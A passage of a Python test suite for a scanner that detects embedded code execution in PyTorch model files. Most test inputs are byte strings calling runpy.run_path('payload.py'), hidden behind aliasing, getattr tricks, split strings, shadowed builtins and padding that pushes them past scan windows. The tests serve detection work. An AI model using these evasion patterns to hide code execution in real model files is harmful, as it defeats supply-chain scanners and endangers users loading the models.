                True,
            ),
            (
                b"",
                b"rp.run_path = print\nimport builtins\nclass Safe:\n    @staticmethod\n"
                b"    def update(*args, **kwargs):\n        pass\nif globals().get('enabled'):\n"
                b"    builtins.dict = Safe\nbuiltins.dict.update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
                b"if globals().get('enabled'):\n    dict = Safe\n"
                b"dict.update(\n    rp.__dict__, run_path=print\n)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.__dict__['dict'] = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.__dict__.update(dict=Safe)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
                b"mapping.update(dict=real)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nbuiltins.__dict__.update(\n"
                b"    dict=real\n)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"import builtins\ngetattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\ngetattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\ndef inert():\n    builtins.dict = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars(bi).update(dict=Safe)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbi = builtins\nbi.dict = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nclass Holder:\n    pass\nbi = Holder()\nbi.dict = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"class Restore:\n    rp.run_path = original\n",
                True,
            ),
            (b"", b"class SafeState:\n    rp.run_path = print\n", False),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nclass Shadow:\n    builtins.dict = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\ngetattr = lambda *args: Safe\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\ngetattr = lambda *args: Safe\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars = lambda obj: {}\nvars(builtins).update(dict=Safe)\n"
                b"builtins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"restore = (\n    dict.update\n)\nrestore(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"import builtins\nrestore = getattr(builtins, 'dict').update\nrestore(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
                b"restore = mapping.update\nrestore(dict=real)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"ns = rp.__dict__\nif globals().get('enabled'):\n    ns = {}\nns.update(run_path=print)\n",
                True,
            ),
            (
                b"",
                b"class Safe:\n    run_path = print\nmod = rp\n"
                b"if globals().get('enabled'):\n    mod = Safe\nmod.run_path = print\n",
                True,
            ),
            (
                b"",
                b"class SafeState:\n    apply = dict.update\n    apply(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\ngetattr = lambda *args: Safe\n"
                b"if globals().get('enabled'):\n    getattr = builtins.getattr\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.getattr = lambda *args: Safe\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.getattr = lambda *args: Safe\n"
                b"getattr \\\n (builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nif globals().get('enabled'):\n    builtins.getattr = lambda *args: Safe\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.__dict__['getattr'] = lambda *args: Safe\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars(builtins)['getattr'] = lambda *args: Safe\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars(builtins).__setitem__('getattr', lambda *args: Safe)\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars(builtins).update(getattr=lambda *args: Safe)\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nbuiltins.vars = lambda obj: {}\n"
                b"vars(builtins).update(dict=real)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal_getattr = builtins.getattr\nbuiltins.getattr = lambda *args: Safe\n"
                b"builtins.getattr = real_getattr\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbuiltins.getattr = lambda *args: Safe\nbuiltins.getattr = getattr\n"
                b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\ngetattr = lambda *args: Safe\ndel getattr\n"
                b"getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nvars = lambda obj: {}\ndel vars\nvars(builtins).update(dict=Safe)\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (b"", b"if False:\n    dict = object\ndict.update(rp.__dict__, run_path=print)\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"if False:\n    dict = object\ndict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
        ],
    )
    def test_scan_model_preserves_latest_late_runpy_member_state(
        self, prefix_state: bytes, late_state: bytes, expect_finding: bool
    ) -> None:
        detector = JITScriptDetector()
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xffimport runpy as rp\n"
            + prefix_state
            + padding
            + late_state
            + b"((rp).run_path)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")
        has_dynamic_finding = any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

        assert has_dynamic_finding is expect_finding

    @pytest.mark.parametrize(
        ("late_state", "call_line"),
        [
            (b"mod = rp\nmod.run_path = original\n", b"((mod).run_path)('payload.py')\n"),
            (b"mod = rp\nmod.run_path = original\n", b"((rp).run_path)('payload.py')\n"),
            (b"\x00\xffrp.run_path = original\n\x00\xff", b"((rp).run_path)('payload.py')\n"),
            (b"\x00\xffrp.run_path = original\n", b"\x00\xff(\n rp.run_path\n)('payload.py')\n"),
            (b"\x00\xffrp.run_path = original\n", b"\x00\xffrp \\\n .run_path('payload.py')\n"),
            (
                b"\x00\xffrp.run_path = original\n",
                b"\x00\xffgetattr \\\n (rp, 'run_path')('payload.py')\n",
            ),
            (
                b"\x00\xffrp.run_path = original\n",
                b"\x00\xffgetattr(rp, 'run_path')('payload.py')\n",
            ),
            (
                b"\x00\xffrp.run_path = original\n",
                b"\x00\xffgetattr(rp, 'run_' + 'path')('payload.py')\n",
            ),
            (
                b"\x00\xffrp.run_path = original\n",
                b"\x00\xffgetattr \\\n (rp, 'run_' + 'path')('payload.py')\n",
            ),
            (
                b"\x00\xffrp.run_path = original\n",
                b"\x00\xffgetattr(\n rp, 'run_' + 'path'\n)('payload.py')\n",
            ),
            (b"\x00\xffrp.__dict__['run_path'] = original\n", b"((rp).run_path)('payload.py')\n"),
            (b"\x00\xffvars(rp).update(run_path=original)\n", b"((rp).run_path)('payload.py')\n"),
            (
                b"\x00\xffrp.__dict__.update({'other': print, 'run_path': original})\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"\x00\xffvars(rp).update(other=print, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (b"\x00\xffrp.__dict__.update(**{'run_path': original})\n", b"((rp).run_path)('payload.py')\n"),
            (
                b"\x00\xffrp.__dict__.update({'other': {'x': print}, 'run_path': original})\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"restore = rp.__dict__.update\n\x00\xffrestore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (b"\x00\xffdict.update(rp.__dict__, run_path=original)\n", b"((rp).run_path)('payload.py')\n"),
            (
                b"\x00\xffrestore = dict.update\nrestore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\n\x00\xffrestore = builtins.dict.update\nrestore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"ns = rp.__dict__\n\x00\xffns.update(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"restore = vars(rp).update\n\x00\xffrestore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"\x00\xffns = rp.__dict__\nns.update(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"\x00\xffrestore = vars(rp).update\nrestore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"mod = rp\nns = mod.__dict__\nns.update(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"mod = rp\nrestore = vars(mod).update\nrestore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\nrestore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"mod = rp\nmapping = mod.__dict__\nsecond = mapping\nrestore = second.update\n"
                b"restore(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\napply = restore\n"
                b"apply(run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (b"\x00\xffrp.__dict__['run_' + 'path'] = original\n", b"((rp).run_path)('payload.py')\n"),
            (b"\x00\xffrp.__dict__['run' + '_path'] = original\n", b"((rp).run_path)('payload.py')\n"),
            (
                b"\x00\xffrp.__dict__[\n    'run' + '_path'\n] = original\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"\x00\xffrp.__dict__.update(\n    **{'run' + '_path': original}\n)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"\x00\xffrp.__dict__.__setitem__('run_' + 'path', original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"if globals().get('enabled'):\n    rp.run_path = original\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"if globals().get('enabled'):\n    restore = dict.update\nrestore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"class Restore:\n    rp.run_path = original\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"restore = (\n    dict.update\n)\nrestore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\nrestore = getattr(builtins, 'dict').update\n"
                b"restore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
                b"restore = mapping.update\nrestore(dict=real)\n"
                b"builtins.dict.update(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\n"
                b"if globals().get('enabled'):\n    mapping = builtins.__dict__\n"
                b"mapping.update(dict=real)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"class Restore:\n    restore = dict.update\n    restore(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
            (
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
                b"restore = mapping.update\nif globals().get('enabled'):\n    restore = Safe.update\n"
                b"restore(dict=real)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
                b"((rp).run_path)('payload.py')\n",
            ),
        ],
    )
    def test_scan_model_detects_possible_late_runpy_member_restore(self, late_state: bytes, call_line: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
            + padding
            + late_state
            + call_line
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_deep_folded_framed_runpy_getattr_without_recursion(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        member_expression = b" + ".join([b"'run_'", *([b"''"] * 1_000), b"'path'"])
        source = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + b"\x00\xffgetattr(rp, "
            + member_expression
            + b")('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize("frame", [b"", b"\x00\xff"])
    def test_scan_model_detects_late_runpy_call_after_unreachable_member_overwrite(self, frame: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + frame
            + b"if False:\n    rp.__dict__.update(run_path=print)\n"
            + b"rp.run_path('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "shadow_state",
        [
            b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
            b"dict = Safe\ndict.update(rp.__dict__, run_path=print)\n",
            b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nbi.dict = Safe\nbuiltins.dict.update(rp.__dict__, run_path=print)\n",
        ],
    )
    def test_scan_model_ignores_shadowed_dict_update_before_dangerous_runpy_call(self, shadow_state: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\n" + padding + shadow_state + b"((rp).run_path)('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "call_line",
        [b"getattr(rp, 'run_path')('safe')\n", b"getattr(\n    rp, 'run_path'\n)('safe')\n"],
    )
    def test_scan_model_ignores_shadowed_getattr_execution_endpoint(self, call_line: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport runpy as rp\n" + padding + b"getattr = lambda obj, name: print\n" + call_line + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_handles_distinct_builtins_alias_noise_before_safe_runpy_call(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        aliases = b"".join(f"import builtins as bi_{index}\n".encode() for index in range(1_000))
        noise = b"    # noise\n" * 1_000
        source = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + aliases
            + noise
            + b"rp.run_path = print\nrp.run_path('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_framed_runpy_member_restore_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
        filler = b"# filler\n" * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(b"# filler\n") + 1)
        source = (
            b"\x00\xffimport runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
            + filler
            + b"\x00\xffrp.run_path = original\n\x00\xff((rp).run_path)('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_wildcard_import_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"from runpy import *\n" + padding + b"run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_runpy_hit_in_compacted_priority_gap(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import os\n" + padding + b"runpy.run_path('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_later_priority_alias_pair_inside_same_block(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"def payload():\n"
            b"    import os\n"
            + padding
            + b"    import runpy as rp\n"
            + padding
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_embedded_python_prefix_context_tail_starts_are_bounded(self) -> None:
        prefix = b"\x00\xffimport runpy as rp\n" + b"# prefix\n" * 1024
        tail_blocks = b"".join(
            f'def harmless_{index}():\n    """rp.run_path(\'payload.py\')"""\n    return {index}\n'.encode()
            for index in range(128)
        )
        data = prefix + (b"# middle\n" * 130_000) + tail_blocks

        windows = jit_script_module._embedded_python_extraction_windows(data)

        assert len(windows) <= 3 + (2 * jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS)

    def test_scan_model_carries_prefix_alias_shadowing_into_tail_context(self) -> None:
        detector = JITScriptDetector()
        prefix = b"\x00\xffclass Safe:\n    run_path = len\nimport runpy as rp\nrp = Safe()\n" + b"# prefix\n" * 1024
        tail = b"def payload():\n    return rp.run_path([])\n"
        source = prefix + (b"# middle\n" * 130_000) + tail

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_middle_tail_alias_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        tail_prefix = b"".join(f"def benign_tail_{index}():\n    return {index}\n\x00".encode() for index in range(24))
        tail_suffix = b"".join(f"def after_tail_{index}():\n    return {index}\n\x00".encode() for index in range(24))
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + b"\x00\xff"
            + tail_prefix
            + b"def payload():\n    return rp.run_path('payload.py')\n\x00"
            + tail_suffix
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_from_compound_prefix_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffif True: import runpy as rp\n"
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_full_prefixed_tail_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        tail_padding_line = b"    # tail\n"
        tail_padding = tail_padding_line * (
            (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES - 200) // len(tail_padding_line)
        )
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + b"\x00\xffdef payload():\n"
            + tail_padding
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_escaped_triple_quote_prefix_import_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\n'
            b'not closed \\"""\n'
            b"import runpy as rp\n"
            b'"""\n' + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_runpy_alias_from_framed_prefix_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrun = runpy.run_path\n" + filler + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_framed_tail_alias_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp\n" + filler + b"\x00\xffdef payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_parenthesized_tail_alias_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + b"\x00\xffdef payload():\n    return ((rp).run_path)('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_multiline_parenthesized_tail_alias_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + b"\x00\xffdef payload():\n    return (\n        rp.run_path\n    )('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_after_noisy_prefix_context_budget(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        detector = JITScriptDetector()
        monkeypatch.setattr(jit_script_module, "_EMBEDDED_PYTHON_SCAN_WINDOW_BYTES", 4096)
        long_alias = "unused_" + "x" * 900
        noise = b"".join(f"import runpy as {long_alias}_{index}\n".encode() for index in range(20))
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xff"
            + noise
            + b"import runpy as rp\n"
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
